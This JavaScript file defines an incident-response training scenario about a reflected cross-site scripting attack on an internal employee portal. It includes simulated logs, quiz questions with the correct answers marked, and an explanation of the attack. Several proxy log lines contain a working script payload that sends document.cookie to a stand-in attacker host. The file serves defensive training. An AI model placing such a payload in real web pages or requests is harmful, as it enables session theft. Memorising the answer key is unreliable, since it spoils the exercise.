scenarios.push({
    id: "ir-scenario-2026-xss-attack",
    title: "Operation Script Trap: Cross-Site Scripting",
    description: "Suspicious script payloads detected in search-query parameters of the internal employee portal, followed by unauthorized session activity.",
    logs: {
        proxy: [
            "2026-05-29T10:45:12Z - IP: 192.168.10.14 - URL: https://github.com/company-org - Action: Allowed - Bytes: 15320",
            "2026-05-29T11:00:15Z - IP: 192.168.10.12 - URL: https://portal.company.local/search?q=benefits - Action: Allowed - Status: 200 - Bytes: 4500",
            "2026-05-29T11:02:30Z - IP: 192.168.10.33 - URL: https://portal.company.local/dashboard - Action: Allowed - Status: 200 - Bytes: 1240",
            "2026-05-29T11:05:40Z - IP: 192.168.10.88 - URL: https://portal.company.local/search?q=<script>fetch('https://attacker.top/steal?c='+document.cookie)</script> - Action: Allowed - Status: 200 - Bytes: 4200",
            "2026-05-29T11:08:22Z - IP: 192.168.10.12 - URL: https://portal.company.local/search?q=<script>fetch('https://attacker.top/steal?c='+document.cookie)</script> - Action: Allowed - Status: 200 - Bytes: 4200",
            "2026-05-29T11:10:05Z - IP: 192.168.10.15 - URL: https://www.google.com/search?q=weather - Action: Allowed - Bytes: 1200",
            "2026-05-29T11:15:00Z - IP: 192.168.10.12 - URL: https://attacker.top/steal?c=sessionid=ABC123XYZ - Action: Allowed - Status: 200 - Bytes: 45",
            "2026-05-29T11:18:45Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Bytes: 3100",
            "2026-05-29T11:20:00Z - IP: 203.0.113.10 - URL: https://portal.company.local/admin/user_mgmt - Action: Allowed - Status: 200 - Cookie: sessionid=ABC123XYZ - Bytes: 12500",
            "2026-05-29T11:25:12Z - IP: 192.168.10.12 - URL: https://portal.company.local/logout - Action: Allowed - Status: 200 - Bytes: 450"
        ],
        email: [
            "2026-05-29T10:40:00Z - Inbound - From: notifications@slack.com - To: asmith@company.com - Subject: You have unread messages - Status: Delivered",
            "2026-05-29T10:55:00Z - Inbound - From: hr-internal@portal-update.com - To: fsmith@company.com - Subject: Action Required: Review New Benefits Search Feature - Link: https://portal.company.local/search?q=<script>...</script> - Status: Delivered",
            "2026-05-29T11:05:12Z - Inbound - From: newsletters@techcrunch.com - To: asmith@company.com - Subject: TechCrunch Daily - Status: Delivered",
            "2026-05-29T11:30:00Z - Outbound - From: mrogers@company.com - To: candidates@jobmail.com - Subject: Interview Schedule - Status: Sent"
        ],
        file_server: [
            "2026-05-29T10:30:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
            "2026-05-29T11:22:00Z - Share Name: \\\\FILE-SRV-01\\HR - Access Request: Allowed - Source IP: 203.0.113.10 - User: COMPANY\\fsmith (via Web Session)",
            "2026-05-29T11:45:11Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.15 - User: COMPANY\\mrogers"
        ],
        workstations: [
            "2026-05-29T09:01:22Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe",
            "2026-05-29T11:08:22Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: chrome.exe spawned - URL: https://portal.company.local/search?q=...",
            "2026-05-29T11:30:12Z - WKSTN-01 (192.168.10.10) - EventID: 4800 - Workstation Locked - User: COMPANY\\asmith"
        ],
        auth_logs: [
            "2026-05-29T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith",
            "2026-05-29T08:15:32Z - WKSTN-04 (192.168.10.45) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe",
            "2026-05-29T11:20:00Z - Web_Auth - User: fsmith@company.com - App: Employee Portal - Status: Success - Source: 203.0.113.10 - Note: Session Token Reuse Detected"
        ]
    },
    questions: {
        vector: {
            label: "What type of vulnerability was exploited to steal the user's session?",
            type: "select",
            options: [
                "Reflected Cross-Site Scripting (XSS)",
                "Stored Cross-Site Scripting (XSS)",
                "SQL Injection in the search bar",
                "Phishing for plaintext credentials"
            ],
            correct: "Reflected Cross-Site Scripting (XSS)"
        },
        delivery: {
            label: "How was the malicious script payload delivered to the victim?",
            type: "select",
            options: [
                "Embedded in a phishing email link",
                "Uploaded as a malicious profile picture",
                "Through a compromised third-party browser extension",
                "Directly injected into the web server's database"
            ],
            correct: "Embedded in a phishing email link"
        },
        indicator: {
            label: "What log entry confirms that the session theft was successful?",
            type: "select",
            options: [
                "A 500 error on the search page",
                "A 200 OK response for a request to attacker.top containing a session cookie",
                "The creation of a new user account on WKSTN-02",
                "An oversized ICMP ping from the employee portal"
            ],
            correct: "A 200 OK response for a request to attacker.top containing a session cookie"
        }
    },
    principles: ["Cross-Site Scripting (XSS)", "Phishing / Social Engineering", "Unauthorized Privilege Use"],
    explanation: "The incident began with a phishing email sent to user 'fsmith'. The email contained a link to the internal employee portal with a malicious JavaScript payload reflected in the 'q' search parameter. When fsmith clicked the link at 11:08:22Z, the script executed in their browser, fetching their session cookie and sending it to the attacker's external domain 'attacker.top'. The attacker then immediately used this stolen session token at 11:20:00Z from an external IP (203.0.113.10) to access the administrative areas of the portal and HR files. This is a classic Reflected XSS attack combined with Session Hijacking."
});
